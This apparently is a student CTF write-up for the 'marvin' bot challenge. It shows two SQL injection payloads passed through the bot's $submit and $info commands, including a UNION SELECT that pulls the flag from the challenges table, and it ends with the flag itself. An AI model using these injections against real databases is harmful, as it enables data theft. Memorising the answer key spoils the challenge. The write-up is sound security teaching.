# marvin
On October first, 2021, during the first ctf-league meeting of the 2021-2022 school year, the ultra stable and super secure marvin was hacked (unintentionally) by one of our very own ctf-league players who had a single quote in their username. Luckily, no sensitive data was exposed and the bug(s) were fixed the same night that they were discovered. Tonight we're taking a step back in time, to find out how much damage the vulnerabilities could have caused if they had been left unchecked. The flag for tonight's challenge has been added to old_marvin's database. Good luck!

## write up
The first step is to download the github to see how the marvin bot works. Inside `marvin-main/Member.py` it shows all the sql commands that the database uses. Then you can message marvin
directly to find out what commands it and take. Looking at the `$submit` command you can see that is where it submits the flag for the each user. 


## sql injection steps
After typing in this command you will see that marvin tells you that the `chal_id` is corect. In this case its `chal_id=9`. 
```
$submit "hi' OR chal_id=9;"
```

Using the `UNION` clause you can submit another query. After typing this in you will get the flag.
```
$info "' UNION SELECT flag,category,points,download,access,description FROM challenges WHERE chal_id=9;"

```

## flag
`osu{GOoD_lUCK_F1Nd1nG_7H15_M4rv1N_wOuLd_neVer_lE4k_4_fl4g}`